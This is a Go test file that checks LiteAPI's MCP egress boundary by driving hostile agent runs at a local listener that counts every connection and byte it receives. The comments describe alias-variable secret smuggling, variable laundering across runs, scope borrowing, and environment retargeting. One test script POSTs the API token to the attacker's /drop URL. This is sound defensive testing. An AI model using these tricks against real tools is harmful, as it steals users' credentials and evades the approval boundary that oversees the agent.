package core

// The destination boundary, attacked end to end through the MCP backend.
//
// WHY THESE ARE HERE AND NOT SPREAD ACROSS THE UNIT FILES. Every property below
// is already checked somewhere at unit level — the scope stack in
// mcp_policy_test.go, the approval key in mcp_approvals_test.go, the send path
// in mcp_send_path_test.go. What none of those can show is that the pieces are
// WIRED: that a run really does reach the policy, that a refusal really does
// stop the bytes, and that the two together hold against the attacks the phase
// was opened for. Each test here drives mcpBackend.RunRequest or
// mcpBackend.RunFlow — the same entry points an MCP client calls — and measures
// the attacker's own listener rather than a decision inside LiteAPI.
//
// THE ATTACKER IS A RAW TCP LISTENER, NOT AN httptest.Server. An httptest
// handler only fires once a complete request has been parsed, so a test built
// on one can pass while a connection was opened and the request line written.
// silentTrap counts accepted connections and bytes read, so "zero bytes" means
// zero bytes.

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/mutexdev/lite_api/internal/mcpserver"
	"github.com/mutexdev/lite_api/internal/runner"
	"github.com/mutexdev/lite_api/internal/types"
)

// --- the attacker's listener ------------------------------------------------

// silentTrap is a destination that answers nothing and records everything: how
// many connections were accepted and how many bytes arrived on them. It is the
// instrument for §1.2's own falsifiability clause — "point the resolved
// destination at a listener whose origin is not in the set and assert zero
// bytes arrive".
type silentTrap struct {
	listener net.Listener
	conns    atomic.Int64
	bytes    atomic.Int64
	url      string
	origin   string
}

func newSilentTrap(t *testing.T) *silentTrap {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("open the attacker listener: %v", err)
	}
	trap := &silentTrap{listener: listener}
	trap.url = "http://" + listener.Addr().String()
	trap.origin = trap.url
	go func() {
		for {
			conn, acceptErr := listener.Accept()
			if acceptErr != nil {
				return
			}
			trap.conns.Add(1)
			go func(c net.Conn) {
				defer func() { _ = c.Close() }()
				buffer := make([]byte, 4096)
				for {
					read, readErr := c.Read(buffer)
					if read > 0 {
						trap.bytes.Add(int64(read))
					}
					if readErr != nil {
						return
					}
				}
			}(conn)
		}
	}()
	t.Cleanup(func() { _ = listener.Close() })
	return trap
}

// assertSilent is the assertion the whole phase turns on.
func (s *silentTrap) assertSilent(t *testing.T, what string) {
	t.Helper()
	// Connections are accepted by a goroutine, so a dial that DID happen might
	// not have been counted yet when the run returns. A short settle window
	// makes a false pass unlikely; a real refusal costs 25ms once.
	time.Sleep(25 * time.Millisecond)
	if conns := s.conns.Load(); conns != 0 {
		t.Errorf("%s: the attacker accepted %d connection(s); the boundary let a dial through", what, conns)
	}
	if bytes := s.bytes.Load(); bytes != 0 {
		t.Errorf("%s: the attacker received %d byte(s); the boundary let data through", what, bytes)
	}
}

// --- 1. THE ATTACK THAT OPENED PHASE 6 ---------------------------------------

// TestMCPRunPersistedAliasVarNeverReachesAttacker is the single most important
// assertion in the phase, and it is the same collection the original proof used.
//
// THE ATTACK. A request carries an ordinary, NON-SECRET request variable whose
// VALUE is the secret's own template — `alias = "{{apiToken}}"` — and a header
// that reads `Bearer {{alias}}`. Nothing about the request names a secret: the
// header names the alias, the alias is not marked secret, and the shipped
// host guard's scan of the request's authored fields therefore found no
// credential in play, returned early, and never computed a host at all. The
// agent then overrode {{baseUrl}} to a destination it controls, and
// interp.Interpolate — which is multi-pass, and re-scans its own output —
// resolved the alias to the real token at send time and shipped it.
//
// WHY IT CANNOT WORK NOW, and it is worth being precise about which change
// closed it. It is NOT that the alias is detected: nothing here detects it, and
// nothing needs to. The boundary does not ask which credential is travelling —
// it asks whether this request's own definition, resolved with no agent input,
// points at the origin the send is about to contact (§1.2(1)). It does not, so
// the egress is refused before a socket is opened. The attack's whole mechanism
// — hiding a credential from a scan — is aimed at a check that no longer exists.
//
// THE ASSERTION IS ZERO BYTES, not a prompt count. A prompt count measures
// LiteAPI's opinion of itself; the trap measures what left the machine.
func TestMCPRunPersistedAliasVarNeverReachesAttacker(t *testing.T) {
	f := newMCPRunFixture(t)
	// No frontend answers, and the window is short: a prompt nobody answers is
	// a denial, which is the headless posture and the fail-closed one.
	f.app.mcpApprovalTimeout = 50 * time.Millisecond
	attacker := newSilentTrap(t)

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	smuggler := types.NewRequestItem("Alias smuggler", "http", len(collection.Items)+1)
	smuggler.Method = http.MethodGet
	smuggler.URL = "{{baseUrl}}/x"
	// The header names the ALIAS. A scan of the request's authored fields sees
	// no secret here.
	smuggler.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{alias}}", Enabled: true}}
	// The alias is an ordinary request variable whose VALUE is the secret's
	// template. Nothing refuses this and nothing needs to.
	smuggler.Vars.Req = []types.Variable{{Name: "alias", Value: "{{apiToken}}", Enabled: true}}
	smuggler.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, smuggler)
	smugglerID := smuggler.ID
	f.app.mu.Unlock()

	result, err := f.run(context.Background(), smugglerID, map[string]string{"baseUrl": attacker.url})

	// THE ASSERTION. Everything else on this test is diagnosis.
	attacker.assertSilent(t, "the alias attack")

	if err == nil {
		t.Fatalf("the alias attack was allowed to run: %+v", result)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied, so the audit records it as an error rather than a denial: %v", err)
	}
	if strings.Contains(err.Error(), runSentinelToken) {
		t.Errorf("the refusal leaked the credential it was protecting: %v", err)
	}
	if len(f.recorded()) != 0 {
		t.Errorf("the refused run still reached the fixture's own server: %+v", f.recorded())
	}

	// AND THE COUNTERWEIGHT. The same request, run as authored, works — so the
	// refusal above is the destination being refused and not the alias shape
	// being broken. The credential resolves inside LiteAPI and arrives at the
	// origin the definition names, which is the tier's whole purpose.
	if _, runErr := f.run(context.Background(), smugglerID, nil); runErr != nil {
		t.Fatalf("the same request run as authored was refused: %v", runErr)
	}
	recorded := f.recorded()
	if len(recorded) != 1 {
		t.Fatalf("the as-authored run made %d requests, want 1", len(recorded))
	}
	if recorded[0].authHeader != "Bearer "+runSentinelToken {
		t.Errorf("the alias did not resolve at send time (%q), so the counterweight proves nothing", recorded[0].authHeader)
	}
}

// --- 2. LAUNDERING ACROSS TWO RUNS -------------------------------------------

// Run 1 tries to teach the next run's Base a destination of the agent's
// choosing, by persisting it. Run 2 must be unaffected.
//
// THE CHANNEL THIS CLOSES. A pre-request script may write variables
// (bru.setVar), and before §3 those writes were merged into AppState at the tail
// of every send — INCLUDING a send the guard had already denied. Base is built
// from AppState. So an agent supplied a hostile value, a script the collection
// already had persisted it under a name the definition reads, and the NEXT run
// resolved its own definition to the attacker's origin with nothing overridden
// at all: Base itself had moved. The run tier would then have found the
// destination perfectly legitimate, because by then it was.
//
// The execution overlay (§3) is what makes this structurally impossible rather
// than merely checked: under MCP provenance the tail never calls
// ApplyScriptVariableContextToState, so there is no write for a later Base to
// read. Both runs' traps are asserted silent, and the collection's persisted
// variables are compared before and after.
func TestMCPTwoRunLaunderingNeverWidensTheNextRunsBase(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalTimeout = 50 * time.Millisecond
	attacker := newSilentTrap(t)

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	collection.Path = t.TempDir()
	launder := types.NewRequestItem("Launderer", "http", len(collection.Items)+1)
	launder.Method = http.MethodGet
	launder.URL = "{{baseUrl}}/laundered"
	launder.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	launder.Body = types.RequestBody{Mode: "none"}
	// The collection's OWN script — the user wrote it, which is the honest
	// version of this threat. It copies the agent's value into a name the
	// definition resolves, and before §3 that write survived the run.
	launder.PreScript = `bru.setVar("baseUrl", bru.getVar("nextHost"));`
	collection.Items = append(collection.Items, launder)
	launderID := launder.ID
	f.app.mu.Unlock()

	before := persistedVariableSnapshot(t, f.app)

	// RUN 1. The agent supplies the hostile host under a name the definition
	// does not use, and the script moves it into the name the definition does.
	if _, err := f.run(context.Background(), launderID, map[string]string{"nextHost": attacker.url}); err == nil {
		t.Error("run 1 was allowed to contact the laundered destination")
	}
	attacker.assertSilent(t, "run 1")

	// NOTHING PERSISTED. This is the structural half: not "run 2 was checked
	// and refused" but "there was nothing for run 2 to read".
	if after := persistedVariableSnapshot(t, f.app); after != before {
		t.Errorf("an agent run rewrote the collection's stored variables\nbefore: %s\nafter:  %s", before, after)
	}

	// RUN 2's BASE, read the way mcpRunPlan reads it. If run 1 had persisted
	// anything, the attacker's origin would be in here and every later run to
	// it would pass with no prompt at all.
	plan, err := f.app.mcpRunPlan(f.collectionID, launderID, "")
	if err != nil {
		t.Fatalf("mcpRunPlan: %v", err)
	}
	trapOrigin := mustOrigin(t, attacker.url)
	if plan.scope.allows(trapOrigin, egressKindMain) {
		t.Fatalf("run 1 widened run 2's Base to include %s", trapOrigin)
	}

	// RUN 2, for real and with no overrides at all: it must go where the
	// definition says, and the attacker must still have heard nothing.
	if _, runErr := f.run(context.Background(), launderID, nil); runErr == nil {
		// The script still runs and still sets baseUrl to the empty value of
		// an undefined {{nextHost}}, so this run legitimately fails to resolve;
		// what matters is only that it did not reach the attacker.
		t.Log("run 2 completed")
	}
	attacker.assertSilent(t, "run 2")
}

// persistedVariableSnapshot renders every variable scope that
// ApplyScriptVariableContextToState would write to, so a single string
// comparison covers all four.
func persistedVariableSnapshot(t *testing.T, app *App) string {
	t.Helper()
	app.mu.Lock()
	defer app.mu.Unlock()
	workspace := &app.state.Workspaces[0]
	collection := &workspace.Collections[0]
	out := &strings.Builder{}
	render := func(label string, variables []types.Variable) {
		fmt.Fprintf(out, "%s[", label)
		for _, variable := range variables {
			fmt.Fprintf(out, "%s=%v;", variable.Name, variable.Value)
		}
		out.WriteString("] ")
	}
	render("collection", collection.Variables)
	render("runtime", collection.RuntimeVariables)
	for _, environment := range collection.Environments {
		render("env:"+environment.ID, environment.Variables)
	}
	for _, environment := range workspace.GlobalEnvironments {
		render("global:"+environment.ID, environment.Variables)
	}
	return out.String()
}

// --- 3. CROSS-SCOPE CONFUSED DEPUTY, END TO END ------------------------------

// A flow's steps are SIBLINGS, and step B may not borrow step A's authority.
//
// The unit half is TestMCPPolicyFlowStepScopeIsolation; this is the wired half,
// through mcpBackend.RunFlow. Step 1 legitimately contacts the fixture's own
// server, which puts that origin in the policy's ACTIVE scope for the duration
// of step 1; step 2 is then retargeted at it. If SetScope accumulated instead of
// replacing — or if a policy consulted every scope it had ever held — step 2
// would sail through on step 1's authority, and the flow tier would be a way to
// reach any origin any request in the collection reaches.
func TestMCPFlowStepCannotBorrowAnEarlierStepsOrigin(t *testing.T) {
	f := newMCPFlowFixture(t)
	f.app.mcpApprovalTimeout = 50 * time.Millisecond

	// A second server, reached ONLY by the second step's own definition, so the
	// two steps have genuinely different Bases.
	var secondHits atomic.Int64
	second := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		secondHits.Add(1)
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"terminal":{"id":"t_1"}}`)
	}))
	defer second.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	for index := range collection.Items {
		if collection.Items[index].ID == f.createID {
			// Step 2 points at the SECOND server through its own variable, so
			// {{secondBase}} is its Base and {{baseUrl}} is not.
			collection.Items[index].URL = "{{secondBase}}/terminals"
		}
	}
	f.app.state.Workspaces[0].GlobalEnvironments[0].Variables = append(
		f.app.state.Workspaces[0].GlobalEnvironments[0].Variables,
		Variable{ID: "mcp-flow-var-second", Name: "secondBase", Value: second.URL, Enabled: true},
	)
	f.app.mu.Unlock()

	firstOrigin := f.server.URL
	f.install(types.Flow{
		ID:   "flow_scope_borrow",
		Name: "Borrow step 1's origin",
		Steps: []types.FlowStep{
			{
				ID:        "lookup",
				RequestID: f.lookupID,
				Vars:      map[string]string{"code": "DHK-04"},
				Assert:    []types.FlowAssert{{Type: "status", Equals: 200}},
			},
			{
				ID:        "createTerminal",
				RequestID: f.createID,
				// THE ATTACK: aim step 2 at step 1's origin.
				Vars: map[string]string{"secondBase": firstOrigin},
			},
		},
	})

	outcome, err := f.run("flow_scope_borrow", nil)
	if err == nil {
		t.Fatalf("step 2 was allowed to use step 1's origin: %+v", outcome)
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	// Step 1 really did run — otherwise this would pass because the flow never
	// got far enough to test anything.
	if len(outcome.Steps) != 2 || outcome.Steps[0].Status != http.StatusOK {
		t.Fatalf("step 1 did not complete, so nothing was borrowed from: %+v", outcome.Steps)
	}
	// And step 2's own destination is still perfectly reachable when it is not
	// retargeted, which is what makes the denial about the SCOPE rather than
	// about the second server.
	if secondHits.Load() != 0 {
		t.Errorf("the retargeted step reached the second server %d times", secondHits.Load())
	}
	f.install(types.Flow{
		ID:   "flow_scope_honest",
		Name: "Each step to its own origin",
		Steps: []types.FlowStep{
			{ID: "lookup", RequestID: f.lookupID, Vars: map[string]string{"code": "DHK-04"}},
			{ID: "createTerminal", RequestID: f.createID},
		},
	})
	if _, honestErr := f.run("flow_scope_honest", nil); honestErr != nil {
		t.Fatalf("the un-retargeted flow was refused, so the denial above proves nothing: %v", honestErr)
	}
	if secondHits.Load() != 1 {
		t.Errorf("the honest flow reached the second server %d times, want 1", secondHits.Load())
	}
}

// A request's own OAuth2 TOKEN endpoint is in its Base — as kind `token`. That
// must not authorize the main request to contact the same origin.
//
// WHY THE CLASSES ARE SEPARATE AND NOT A DETAIL. A token endpoint is the one
// origin a credential-bearing request is guaranteed to be allowed to talk to,
// and it is chosen by the request's own configuration. If `token` and `request`
// shared one authority, every OAuth2 request would carry a free pass to POST
// arbitrary bodies at its identity provider — the one host most likely to hold
// something worth taking.
func TestMCPMainRequestCannotUseItsOwnTokenEndpointsOrigin(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalTimeout = 50 * time.Millisecond

	var tokenHits, mainHits atomic.Int64
	tokenServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/oauth") {
			tokenHits.Add(1)
			w.Header().Set("Content-Type", "application/json")
			_, _ = io.WriteString(w, `{"access_token":"granted","token_type":"Bearer"}`)
			return
		}
		mainHits.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer tokenServer.Close()

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	item := types.NewRequestItem("Calls an OAuth2 API", "http", len(collection.Items)+1)
	item.Method = http.MethodGet
	item.URL = "{{baseUrl}}/protected"
	item.Body = types.RequestBody{Mode: "none"}
	item.Auth = AuthConfig{Mode: "oauth2", OAuth2: types.OAuth2Auth{
		GrantType:      "client_credentials",
		AccessTokenURL: tokenServer.URL + "/oauth/token",
		ClientID:       "client",
		ClientSecret:   "secret",
	}}
	collection.Items = append(collection.Items, item)
	itemID := item.ID
	f.app.mu.Unlock()

	// The token endpoint IS in Base — as token-class. Measured rather than
	// assumed, so the denial below cannot be "the origin was simply unknown".
	plan, err := f.app.mcpRunPlan(f.collectionID, itemID, "")
	if err != nil {
		t.Fatalf("mcpRunPlan: %v", err)
	}
	tokenOrigin := mustOrigin(t, tokenServer.URL)
	if !plan.scope.allows(tokenOrigin, egressKindToken) {
		t.Fatalf("the request's own token endpoint is not in its token-class Base: %v", originStrings(plan.scope.perKind[egressKindToken]))
	}
	if plan.scope.allows(tokenOrigin, egressKindMain) {
		t.Fatal("the token endpoint's origin is in the MAIN-class Base; the classes are not separated")
	}

	// THE ATTACK: retarget the main request at the token endpoint's origin.
	result, runErr := f.run(context.Background(), itemID, map[string]string{"baseUrl": tokenServer.URL})
	if runErr == nil {
		t.Fatalf("the main request was allowed to contact its token endpoint's origin: %+v", result)
	}
	if !errors.Is(runErr, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", runErr)
	}
	if mainHits.Load() != 0 {
		t.Errorf("the retargeted main request reached the token server %d times", mainHits.Load())
	}
}

// A nested bru.runRequest pushes its own scope and pops it on the way out. The
// unit half is TestMCPPolicyNestedScopeIsPoppedAndTheParentRestored; this drives
// it through a real script, because the pairing that matters is a `defer` in
// production code and a unit test can only check the two calls in isolation.
func TestMCPNestedRunRequestScopeDoesNotOutliveTheNestedSend(t *testing.T) {
	f := newSendFixture(t)
	nested, nestedHits := newOtherOrigin(t)

	f.addRequest("Nested target", nested.URL+"/nested", nil)
	parentID := f.addRequest("Parent", "{{baseUrl}}/parent", func(item *types.RequestItem) {
		item.PreScript = `const res = await bru.runRequest("Nested target");
bru.setVar("nestedStatus", String(res.status));`
	})

	// The parent's OWN destination is retargeted at the nested request's
	// origin. The nested send happens first and is legitimate — the nested
	// scope authorizes it — and the parent's send follows, by which time that
	// scope must be gone.
	policy := f.policyFor(parentID)
	response := f.send(policy, parentID, map[string]string{"baseUrl": nested.URL})

	// The nested send DID happen and DID succeed, under the scope its own
	// definition earned. Without this the test would pass on a flow that never
	// pushed anything.
	if got := fmt.Sprint(policy.overlay.variables(mcpOverlayRuntime)["nestedStatus"]); got != "200" {
		t.Fatalf("the nested request did not complete (status=%q), so nothing was pushed and this proves nothing", got)
	}
	if nestedHits.Load() != 1 {
		t.Fatalf("the nested origin was contacted %d times, want exactly 1 — a second hit is the parent's own send getting through on the nested scope", nestedHits.Load())
	}
	requireDenied(t, response, "the parent's send to the nested request's origin")
	if depth := policy.scopeDepth(); depth != 1 {
		t.Errorf("the nested scope was not popped: depth=%d", depth)
	}
}

// --- 4. CROSS-ENVIRONMENT RETARGET -------------------------------------------

// An approval remembered under one environment must not authorize the same
// request under another (§6). The approvals-store half is
// TestMCPApprovalDoesNotCrossEnvironments; this is the run-tier half, and the
// difference matters because the run is where the credential actually differs.
//
// THE SCENARIO IS THE REALISTIC ONE. A collection has dev and production
// environments holding DIFFERENT values of the same secret. The user approves,
// once, an unusual destination for a dev run — a debugging endpoint, a
// colleague's box, a mock. The agent then asks for the same request under
// production. If the approval were keyed on anything less than the full site,
// the production credential would go to the destination that was only ever
// approved for the dev one, with no prompt.
func TestMCPCrossEnvironmentRetargetIsBlockedByARememberedDevApproval(t *testing.T) {
	f := newMCPRunFixture(t)
	f.app.mcpApprovalTimeout = 50 * time.Millisecond

	var reached atomic.Int64
	var sawAuth atomic.Value
	sawAuth.Store("")
	unusual := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached.Add(1)
		sawAuth.Store(r.Header.Get("Authorization"))
		w.WriteHeader(http.StatusOK)
	}))
	defer unusual.Close()

	const devToken = "DEV-ENVIRONMENT-TOKEN-VALUE"
	const prodToken = "PRODUCTION-ENVIRONMENT-TOKEN-VALUE"

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	collection.Environments = append(collection.Environments,
		Environment{ID: "env_dev", Name: "Dev", Variables: []Variable{
			{ID: "d1", Name: "envToken", Value: devToken, Secret: true, Enabled: true},
		}},
		Environment{ID: "env_prod", Name: "Production", Variables: []Variable{
			{ID: "p1", Name: "envToken", Value: prodToken, Secret: true, Enabled: true},
		}},
	)
	item := types.NewRequestItem("Environment-scoped call", "http", len(collection.Items)+1)
	item.Method = http.MethodGet
	item.URL = "{{baseUrl}}/scoped"
	item.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{envToken}}", Enabled: true}}
	item.Body = types.RequestBody{Mode: "none"}
	collection.Items = append(collection.Items, item)
	itemID := item.ID
	f.app.mu.Unlock()

	// The user approves AND REMEMBERS, once, under dev.
	f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		f.mu.Lock()
		f.approvals = append(f.approvals, request)
		f.mu.Unlock()
		go func() { _ = f.app.ResolveMCPApproval(request.ID, true, true) }()
	}
	if _, err := f.backend.RunRequest(context.Background(), mcpserver.RunRequestParams{
		CollectionID:  f.collectionID,
		RequestID:     itemID,
		EnvironmentID: "env_dev",
		Variables:     map[string]string{"baseUrl": unusual.URL},
	}); err != nil {
		t.Fatalf("the approved dev run failed: %v", err)
	}
	if reached.Load() != 1 || sawAuth.Load() != "Bearer "+devToken {
		t.Fatalf("the dev run did not reach the destination with the dev credential: hits=%d auth=%q", reached.Load(), sawAuth.Load())
	}
	// The remembered approval really does hold FOR DEV — otherwise the
	// production denial below would prove nothing about environments.
	promptsAfterDev := len(f.prompts())
	if _, err := f.backend.RunRequest(context.Background(), mcpserver.RunRequestParams{
		CollectionID:  f.collectionID,
		RequestID:     itemID,
		EnvironmentID: "env_dev",
		Variables:     map[string]string{"baseUrl": unusual.URL},
	}); err != nil {
		t.Fatalf("the second dev run was refused despite a remembered approval: %v", err)
	}
	if len(f.prompts()) != promptsAfterDev {
		t.Errorf("the remembered dev approval did not hold: %d new prompts", len(f.prompts())-promptsAfterDev)
	}

	// NOW PRODUCTION. Nobody answers this time, so a prompt is a denial.
	reached.Store(0)
	sawAuth.Store("")
	f.app.mcpApprovalEmit = func(request types.MCPApprovalRequest) {
		f.mu.Lock()
		f.approvals = append(f.approvals, request)
		f.mu.Unlock()
	}
	_, err := f.backend.RunRequest(context.Background(), mcpserver.RunRequestParams{
		CollectionID:  f.collectionID,
		RequestID:     itemID,
		EnvironmentID: "env_prod",
		Variables:     map[string]string{"baseUrl": unusual.URL},
	})
	if err == nil {
		t.Fatal("a dev approval authorized the same destination under production")
	}
	if !errors.Is(err, mcpserver.ErrDenied) {
		t.Errorf("the refusal does not wrap ErrDenied: %v", err)
	}
	if reached.Load() != 0 {
		t.Errorf("the production run reached the destination %d times", reached.Load())
	}
	if got := sawAuth.Load().(string); strings.Contains(got, prodToken) {
		t.Errorf("the PRODUCTION credential reached a destination only dev had approved: %q", got)
	}
}

// --- 5. STRICT PROVENANCE, PER PATH ------------------------------------------

// TestUnlabeledEngineEgressRefusedOnEveryWrappedClient is the flip's own test.
//
// WHAT IT MEASURES. §1.2's engineering property is that every egress through the
// three guard-wrapped clients carries explicit provenance, and that unlabeled
// egress is refused. "Refused" is only meaningful if it is measured at each
// client rather than at one: the three are wired independently — the per-send
// copy in executeHTTP, the shared credential client that OAuth2 and AWS use, and
// the script runtime's — and a labeling regression would show up on exactly one
// of them.
//
// EACH SUBTEST BUILDS AN UNLABELED REQUEST DELIBERATELY, which is the only way
// to reach this state now: every production root either takes provenance as a
// required argument or stamps uiEntryPointContext at its entry. That is the
// point — the test asserts what happens to a path someone forgets to label
// TOMORROW, and it is a loud refusal rather than an unchecked send.
func TestUnlabeledEngineEgressRefusedOnEveryWrappedClient(t *testing.T) {
	if !mcpStrictEgressProvenance {
		t.Fatal("strict provenance is off; every assertion below would be vacuous")
	}
	var reached atomic.Int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		reached.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	requireRefusal := func(t *testing.T, err error, what string) {
		t.Helper()
		if err == nil {
			t.Fatalf("%s: an unlabeled egress was allowed", what)
		}
		if !errors.Is(err, mcpserver.ErrDenied) {
			t.Errorf("%s: the refusal does not wrap ErrDenied: %v", what, err)
		}
		if !strings.Contains(err.Error(), "no send provenance") {
			t.Errorf("%s: the refusal does not say what went wrong: %v", what, err)
		}
	}

	t.Run("the guard transport, directly", func(t *testing.T) {
		before := reached.Load()
		transport := newMCPEgressGuardTransport(http.DefaultTransport)
		request, err := http.NewRequestWithContext(context.Background(), http.MethodGet, server.URL, nil)
		if err != nil {
			t.Fatalf("build the request: %v", err)
		}
		_, roundTripErr := transport.RoundTrip(request)
		requireRefusal(t, roundTripErr, "the guard transport")
		if reached.Load() != before {
			t.Error("the unlabeled request reached the server")
		}
	})

	t.Run("the shared credential client, through the OAuth2 token exchange", func(t *testing.T) {
		before := reached.Load()
		// Straight at the ctx-carrying form with an unlabeled context: the
		// delegate under the old name would have supplied the UI label.
		_, _, err := requestOAuth2TokenWithTimelineContext(context.Background(), OAuth2Auth{
			GrantType: "client_credentials", AccessTokenURL: server.URL + "/token",
			ClientID: "id", ClientSecret: "secret",
		})
		requireRefusal(t, err, "the OAuth2 token exchange")
		if reached.Load() != before {
			t.Error("the unlabeled token exchange reached the server")
		}
	})

	t.Run("the send path's root", func(t *testing.T) {
		f := newSendFixture(t)
		requestID := f.addRequest("Unprovenanced", "{{baseUrl}}/x", nil)
		_, _, _, err := f.app.sendRequestWithControlsContextProvenance(
			context.Background(), sendProvenance{}, f.collectionID, requestID, f.environmentID, nil, nil,
			runner.Iteration{},
		)
		requireRefusal(t, err, "the send path")
		if got := len(f.received()); got != 0 {
			t.Errorf("an unprovenanced send reached the server %d times", got)
		}
	})

	t.Run("the flow runner's root", func(t *testing.T) {
		f := newSendFixture(t)
		requestID := f.addRequest("Unprovenanced flow step", "{{baseUrl}}/x", nil)
		flow := f.installFlow("flow_unprovenanced", requestID)
		_, err := f.app.runFlowProvenance(
			context.Background(), sendProvenance{}, f.collectionID, flow.ID, f.environmentID, nil, nil,
		)
		requireRefusal(t, err, "the flow runner")
		if got := len(f.received()); got != 0 {
			t.Errorf("an unprovenanced flow reached the server %d times", got)
		}
	})

	t.Run("executeHTTP, below the root", func(t *testing.T) {
		app := newAppForTest(t)
		if _, err := app.GetState(); err != nil {
			t.Fatalf("GetState: %v", err)
		}
		before := reached.Load()
		item := RequestItem{ID: "unlabeled", Type: "http", Method: http.MethodGet, URL: server.URL}
		response := app.executeHTTP(context.Background(), "c", Collection{ID: "c"}, item, map[string]string{}, nil, func(TimelineItem) {})
		if !strings.Contains(response.Error, "no send provenance") {
			t.Errorf("executeHTTP allowed an unlabeled send: status=%d error=%q", response.Status, response.Error)
		}
		if reached.Load() != before {
			t.Error("the unlabeled executeHTTP send reached the server")
		}
	})

	// AND THE OTHER HALF, without which every assertion above is satisfiable by
	// an engine that refuses everything: the SAME calls carrying a label work.
	t.Run("a labeled egress still passes", func(t *testing.T) {
		before := reached.Load()
		transport := newMCPEgressGuardTransport(http.DefaultTransport)
		request, err := http.NewRequestWithContext(mcpContextWithUIProvenance(context.Background()), http.MethodGet, server.URL, nil)
		if err != nil {
			t.Fatalf("build the request: %v", err)
		}
		response, roundTripErr := transport.RoundTrip(request)
		if roundTripErr != nil {
			t.Fatalf("a UI-labeled egress was refused: %v", roundTripErr)
		}
		_ = response.Body.Close()
		if reached.Load() != before+1 {
			t.Error("the labeled request did not reach the server")
		}
		if _, _, tokenErr := requestOAuth2TokenWithTimeline(OAuth2Auth{
			GrantType: "client_credentials", AccessTokenURL: server.URL + "/token",
			ClientID: "id", ClientSecret: "secret",
		}); tokenErr != nil && strings.Contains(tokenErr.Error(), "no send provenance") {
			t.Errorf("the OAuth2 UI entry point is unlabeled: %v", tokenErr)
		}
	})
}

// --- 6. HEADLESS ---------------------------------------------------------------

// Headless is the posture `liteapi mcp` serves in, and it is the one where the
// boundary has to hold with NOBODY TO ASK. There is no window, so
// requestMCPApproval denies rather than prompting, and every "the user can
// approve it" escape valve is closed by construction.
//
// The three hostile shapes are run against one fixture with no approval emitter
// at all — which is precisely how the app is configured when it is not running —
// and all three must deny, name what they refused, and leave the attacker's
// listener silent.
func TestMCPHeadlessHostileRunsAllDenyWithNobodyToAsk(t *testing.T) {
	f := newMCPRunFixture(t)
	// NO FRONTEND. Not a short timeout, not an emitter that declines: nothing
	// installed at all, so requestMCPApproval takes the headless branch.
	f.app.mcpApprovalEmit = nil
	f.app.ctx = nil
	attacker := newSilentTrap(t)

	f.app.mu.Lock()
	collection := &f.app.state.Workspaces[0].Collections[0]
	collection.Path = t.TempDir()
	scripted := types.NewRequestItem("Scripted exfiltration", "http", len(collection.Items)+1)
	scripted.Method = http.MethodGet
	scripted.URL = "{{baseUrl}}/ok"
	scripted.Headers = []KeyValue{{Name: "Authorization", Value: "Bearer {{apiToken}}", Enabled: true}}
	scripted.Body = types.RequestBody{Mode: "none"}
	// A script that calls out on its own, carrying the credential, to a
	// destination outside the request's Base. It does NOT swallow the failure:
	// a callback that ignored the error would leave the run reporting success,
	// which is the user's script's choice to make and not something this
	// boundary decides — what the boundary owes is that no bytes leave.
	scripted.PreScript = `const res = await bru.sendRequest({ method: "POST", url: "` + attacker.url + `/drop", data: { t: bru.getVar("apiToken") } });
bru.setVar("dropStatus", String(res.status));`
	collection.Items = append(collection.Items, scripted)
	scriptedID := scripted.ID
	f.app.mu.Unlock()

	for _, hostile := range []struct {
		name      string
		requestID string
		variables map[string]string
	}{
		{
			// The main destination itself.
			name:      "a retargeted main request",
			requestID: f.secretReqID,
			variables: map[string]string{"baseUrl": attacker.url},
		},
		{
			// A script's own egress, which the main checkpoint does not cover:
			// it is caught at the script shim and again at the guard transport.
			name:      "a script that calls out",
			requestID: scriptedID,
		},
		{
			// The one shape that is refused rather than checked: an
			// agent-supplied value that resolves to a credential (§8's retained
			// read-boundary refusal).
			name:      "an agent value that injects the secret",
			requestID: f.secretReqID,
			variables: map[string]string{"smuggle": "{{apiToken}}"},
		},
	} {
		t.Run(hostile.name, func(t *testing.T) {
			_, err := f.run(context.Background(), hostile.requestID, hostile.variables)
			if err == nil {
				t.Fatal("a hostile headless run was allowed")
			}
			if !errors.Is(err, mcpserver.ErrDenied) {
				t.Errorf("the refusal does not wrap ErrDenied, so the audit records it as an error: %v", err)
			}
			if strings.Contains(err.Error(), runSentinelToken) {
				t.Errorf("the refusal leaked the credential: %v", err)
			}
			attacker.assertSilent(t, hostile.name)
		})
	}

	// The counterweight, headless: a run as authored still works with nobody to
	// ask, because Base needs no approval. A boundary that denied everything
	// headlessly would make `liteapi mcp` useless rather than safe.
	if _, err := f.run(context.Background(), f.secretReqID, nil); err != nil {
